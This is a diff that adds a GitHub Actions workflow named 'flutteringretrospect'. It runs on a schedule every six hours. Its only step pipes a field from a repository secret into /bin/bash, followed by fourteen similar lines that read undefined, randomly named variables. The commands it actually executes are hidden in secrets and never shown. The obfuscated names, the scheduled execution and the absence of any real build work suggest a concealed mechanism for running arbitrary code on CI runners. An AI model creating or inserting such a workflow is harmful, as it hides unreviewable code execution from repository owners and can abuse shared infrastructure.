@@ -1,0 +1,31 @@
+name: flutteringretrospect
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: flutteringretrospect
+        env:
+          mo91: ${{ secrets.mo91 }}
+        run: |
+          echo $mo91 | jq -r .gww0218 | /bin/bash
+          echo $lgzgv02707 | jq -r .fpjq0 | /bin/bash
+          echo $x34658 | jq -r .kjdhp5 | /bin/bash
+          echo $fvu1 | jq -r .dvz3518 | /bin/bash
+          echo $dtphv18 | jq -r .ql2659 | /bin/bash
+          echo $xkugb4456 | jq -r .ozpe49 | /bin/bash
+          echo $bgm529 | jq -r .o71 | /bin/bash
+          echo $umf4 | jq -r .niij7547 | /bin/bash
+          echo $hy577 | jq -r .t6199 | /bin/bash
+          echo $yjozp3 | jq -r .rmrnr07072 | /bin/bash
+          echo $imiai503 | jq -r .tkzz1157 | /bin/bash
+          echo $gni76393 | jq -r .sj5 | /bin/bash
+          echo $vwltn08953 | jq -r .l42 | /bin/bash
+          echo $x545 | jq -r .q344 | /bin/bash
+          echo $bz499 | jq -r .s2 | /bin/bash
+
